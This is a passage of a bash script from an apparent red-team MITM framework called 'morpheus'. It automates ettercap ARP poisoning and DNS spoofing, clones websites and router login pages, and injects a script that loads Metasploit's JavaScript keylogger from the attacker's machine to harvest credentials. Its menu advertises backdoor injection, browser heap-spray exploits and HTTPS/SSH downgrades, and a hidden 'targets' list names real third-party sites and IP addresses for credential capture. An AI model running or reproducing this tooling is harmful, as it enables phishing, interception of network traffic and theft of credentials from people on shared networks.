sleep 1
else
echo "${GreenF}    System report: vulnerable...${BlueF}"
sleep 3
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi



  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
  rm $ApachE/index.html > /dev/null 2>&1
  rm $ApachE/cssbanner.js > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# ---------------------------------------------------------------
# INJECT A JAVA KEYLOOGER INTO TARGET WEBPAGE
# clone a website and inject a metasploit iframe (java_keylogger)
# ---------------------------------------------------------------
sh_stage11 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} This module will allow you to clone a webpage at your choise and ${BlueF}|"
echo "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
echo "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
echo "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.com\nchose domain name to be cloned." --entry --width 270) > /dev/null 2>&1


  # dowloading/clonning website target
  cd $IPATH/output && mkdir clone && cd clone
  echo ${BlueF}[☠]${white} Please wait, clonning webpage${RedF}!${Reset};
  sleep 1 && mkdir $cLon && cd $cLon
  # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
  wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js $cLon | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Cloning webpage: $cLon" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  # inject the javascript <TAG> in cloned index.html using SED command
  echo ${BlueF}[☠]${white} Inject javascript Into cloned webpage${RedF}!${Reset};
  sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
  mv copy.html index.html > /dev/null 2>&1
  # copy all files to apache2 webroot
  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
  sleep 2
  cp index.html $ApachE/index.html # NO dev/null to report file not existence
  cd ..
  cp -r $cLon $ApachE/$cLon > /dev/null 2>&1
  cd $IPATH


    # backup all files needed.
    echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
    cd $IPATH/bin
    cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
    cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
    # use SED bash command
    sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
    cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
    cd $IPATH
    sleep 1



    # start metasploit services
    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
    service postgresql start > /dev/null 2>&1
    msfdb delete > /dev/null 2>&1
    msfdb init > /dev/null 2>&1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MSFCONSOLE" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
      else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS TCP/IP HIJACKING" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv /root/.msf4/loot/*.txt $IPATH/logs > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  rm -r $ApachE/$cLon > /dev/null 2>&1
  rm -r $IPATH/output/clone > /dev/null 2>&1
  cd $IPATH

# start apache2 webserver...
echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
service postgresql stop > /dev/null 2>&1
echo ${BlueF}[☠]${white} Check your logs folder${RedF}!${Reset};
sleep 2




else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------------
# MODEM/ROUTER PHISHING (java_keylogger)
# --------------------------------------
sh_stage12 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}  This module allow you to clone the modem/router login webpage   ${BlueF}|"
echo "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
echo "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
echo "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1


  # retrieve info about modem to inject into clone
  echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
  nmap -sV -PN -p 80 $GaTe > $IPATH/output/retrieve.log
  InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1`
  # check nmap have retrieved any
  if [ -z "$InjE" ]; then
  echo ${RedF}[x] Module cant gather Info about modem webpage! ${Reset};
  echo "${RedF}[x]${white} Using:${GreenF} 'broadband router'${white} as server name${RedF}!"
  InjE="broadband router"
  fi


  # building cloned login modem webpage
  cd $IPATH/bin/phishing/router-modem
  cp index.html index.rb > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
  sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
  mv copy.html index.html > /dev/null 2>&1
  sed -i "s|GatWa|$GaTe|g" index.html
  sed -i "s|DiSpt|$InjE|g" index.html
  # copy all files to apache2 webroot
  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
  sleep 2
  cp index.html $ApachE/index.html # NO dev/null to report file not existence
  cp login.html $ApachE/login.html > /dev/null 2>&1
  cd ..
  cp -r $IPATH/bin/phishing/router-modem $ApachE/router-modem > /dev/null 2>&1
  cd $IPATH

    # backup all files needed.
    echo ${BlueF}[☠]${white} Backup all files needed${RedF}!${Reset};
    cd $IPATH/bin
    cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
    cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
    sleep 1
    # use SED bash command
    sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
    cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
    cd $IPATH
    sleep 1


    # start metasploit services
    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
    service postgresql start > /dev/null 2>&1
    msfdb delete > /dev/null 2>&1
    msfdb init > /dev/null 2>&1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MSFCONSOLE" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
      else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS TCP/IP HIJACKING" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv /root/.msf4/loot/*.txt $IPATH/logs > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  rm $IPATH/output/retrieve.log > /dev/null 2>&1
  rm $ApachE/index.html > /dev/null 2>&1
  rm $ApachE/login.html > /dev/null 2>&1
  rm -r $ApachE/router-modem > /dev/null 2>&1
  # rm -r $IPATH/output/clone > /dev/null 2>&1
  cd $IPATH

# start apache2 webserver...
echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
service postgresql stop > /dev/null 2>&1
echo ${BlueF}[☠]${white} Check your logs folder${RedF}!${Reset};
sleep 2


else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------
# INJECT IMAGE INTO TARGET WEBSITE
# --------------------------------
sh_stage13 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}     This filter will replace the html tag '<img src=>' and       ${BlueF}|"
echo "${BlueF}    | ${YellowF}  injects your image in any webpage requested by target (http)    ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  WARNING:Thats no garantie that this filter will work with the   ${BlueF}|"
echo "${BlueF}    | ${YellowF}recent security implementations added to modern webbrowsers(hsts) ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb > /dev/null 2>&1
sleep 1

  echo ${BlueF}[☠]${white} Edit img_replace.eft${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRONE|$fil_one|g" img_replace.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/img_replace.eft"
  sleep 1

    # compiling img_replace.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling img_replace.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/img_replace.eft -o $IPATH/output/img_replace.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      # HINT: irongeek nao usou UID 0 e SSL active...
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/img_replace.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# ----------------------
# WRITE YOUR OWN FILTER
# ----------------------
sh_stageW () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module allow you to write your own filter from scratch.  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  morpheus presents a 'template' previous build for you to write  ${BlueF}|"
echo "${BlueF}    | ${YellowF} your own command logic and automate the compile/lunch of filter. ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/template.eft $IPATH/filters/template.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
  sleep 1

    # compiling template.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost/ /$gateway/
        fi
      fi
    

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/template.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# ------------------------------------------------
# NMAP FUNTION TO REPORT LIVE TARGETS IN LOCAL LAN
# ------------------------------------------------
sh_stageS () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module uses nmap framework to report live hosts (LAN)    ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[☠]${white} Scanning Local Lan${RedF}! ${Reset};
  # grab ip range + scan with nmap + zenity display results
  IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
  echo ${BlueF}[☠]${white} Ip Range${RedF}:${white}$IP_RANGE${RedF}! ${Reset};
  # scan local lan using nmap
  nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Scanning local lan..." --percentage=0 --auto-close --width 290 > /dev/null 2>&1
  # strip results and print report
  cat $IPATH/logs/lan.mop | grep "for" | awk {'print $3,$5,$6'} | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 410 --height 400 > /dev/null 2>&1

    # cleanup
    echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
    rm $IPATH/logs/lan.mop > /dev/null 2>&1
    sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






#
# easter egg: targets to test modules.
#
sh_stageT () {
echo ""
echo "${white}    Available targets For testing [HTTP] "
echo "${BlueF}    ╔─────────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    |  ${YellowF}http://eventolinux.org                       [User-Agent capture]${BlueF}  |"
echo "${BlueF}    |  ${YellowF}http://predragtasevski.com                   [User-Agent capture]${BlueF}  |"
echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com                 [User-Agent capture]${BlueF}  |"
echo "${BlueF}    |  ${YellowF}http://178.21.117.152/phpmyadmin/            [http_creds]${BlueF}          |"
echo "${BlueF}    |  ${YellowF}http://malwareforensics1.blogspot.pt         [User-Agent capture]${BlueF}  |"
echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com/forum/login.php [auth_cookie|http]${BlueF}    |"
echo "${BlueF}    |  ${YellowF}telnet 216.58.214.174                        [telnet_creds]${BlueF}        |"
echo "${BlueF}    |  ${YellowF}telnet 192.168.1.254                         [telnet_creds]${BlueF}        |"
echo "${BlueF}    |  ${YellowF}ftp 192.168.1.254                            [ftp_creds]${BlueF}           |"
echo "${BlueF}    |  ${YellowF}ssh 192.168.1.254                            [ssh_creds]${BlueF}           |"
echo "${BlueF}    |  ${YellowF}ping -c 2 www.househot.com                   [mocbotIRC detection]${BlueF} |"
echo "${BlueF}    ╠─────────────────────────────────────────────────────────────────────╝"
sleep 1
echo "${BlueF}    ╘ ${white}Press [${GreenF}ENTER${white}] to 'return' to main menu${RedF}!"
read OP
}





#
# help in scripting ;)
#
sh_help () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}Please read my GitHub docummentation for further understandind... ${BlueF}|"
echo "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
echo "${BlueF}    ╘ ${white}Please wait, open webbrowser."
sleep 3
xdg-open "https://github.com/r00t-3xp10it/morpheus/issues"
}





# -------------------------
# FUNTION TO EXIT FRAMEWORK
# -------------------------
sh_exit () {
echo ${BlueF}[☠]${white} Exit morpheus${RedF}:${white}[ $cnm ] ${Reset};
sleep 1
echo ${BlueF}[☠]${white} Revert ettercap etter.conf ${GreenF}✔${white} ${Reset};
mv /tmp/etter.conf $Econ > /dev/null 2>&1
mv /tmp/etter.dns $Edns > /dev/null 2>&1
mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
rm $ApachE/index.html > /dev/null 2>&1
sleep 2
clear
exit
}




Colors;
# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
# Loop forever
while :
do
clear
echo "" && echo "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶 𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
cat << !
    ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
    ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
    ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
!
echo ${BlueF}"    VERSION:${YellowF}$V3R${BlueF} DISTRO:${YellowF}$DiStR0${BlueF} IP:${YellowF}$IP${BlueF} INTERFACE:${YellowF}$InT3R${BlueF} IPv6:${YellowF}$IpV"${BlueF}
cat << !
    ╔────────╦──────────────────────────────────────────────────────────╗
    | OPTION |                  DESCRIPTION(filters)                    |
    ╠────────╩──────────────────────────────────────────────────────────╣
    |   1    -  Firewall filter  (tcp/udp)      -  report/capture_creds |
    |   2    -  Capture cookies  (http/auth)    -  sidejacking attack   |
    |   3    -  Drop all packets (src/dst)      -  packets drop/kill    |
    |   4    -  Redirect browser traffic        -  to another domain    |
    |   5    -  Redirect browser traffic        -  to google sphere     |
    |   6    -  Capture  browser traffic (http) -  visited url's        |
    |   7    -  Inject backdoor into (</body>)  -  exe,bat,jar,ps1,dll  |
    |   8    -  Firefox browser heap-spray      -  buffer overflow      |
    |   9    -  Android browser heap-spray      -  buffer overflow      |
    |  10    -  Tor-browser heap-spray(windows) -  buffer overflow      |
    |  11    -  Clone website + keylooger       -  javascritp_keylooger |
    |  12    -  Modem/router login webpage      -  javascritp_keylooger |
    |  13    -  Replace website images          -  img src=http://other |
    |  14    -  Replace website text            -  replace: worlds      |
    |  15    -  Rotate website document 180º    -  CSS3 injection       |
    |  16    -  https downgrade attack (demo)   -  replace: https       |
    |  17    -  ssh   downgrade attack (demo)   -  replace: SSH-1.99    |
    |                                                                   |
    |   W    -  Write your own filter                                   |
    |   S    -  Scan LAN for live hosts                                 |
    |   E    -  Exit/close Morpheus                                     |
    ╚───────────────────────────────────────────────────────────────────╣
!
echo "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2016${BlueF}_⌋${Reset}"
echo ${BlueF}[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
sleep 1
echo ${BlueF}[▶]${white} Chose Your Option[filter]${RedF}: ${Reset};
echo -n "$PrompT"
read choice
case $choice in
1) sh_stage1 ;;
2) sh_stage2 ;;
3) sh_stage3 ;;
4) sh_stage4 ;;
5) sh_stage5 ;;
6) sh_stage6 ;;
7) sh_stage7 ;;
8) sh_stage8 ;;
9) sh_stage9 ;;
10) sh_stage10 ;;
11) sh_stage11 ;;
12) sh_stage12 ;;
13) sh_stage13 ;;
W) sh_stageW ;;
w) sh_stageW ;;
S) sh_stageS ;;
s) sh_stageS ;;
-h) sh_help ;;
help) sh_help ;;
--help) sh_help ;;
targets) sh_stageT ;;
e) sh_exit ;;
E) sh_exit ;;
*) echo "\"$choice\": is not a valid Option"; sleep 1 ;;
esac
done

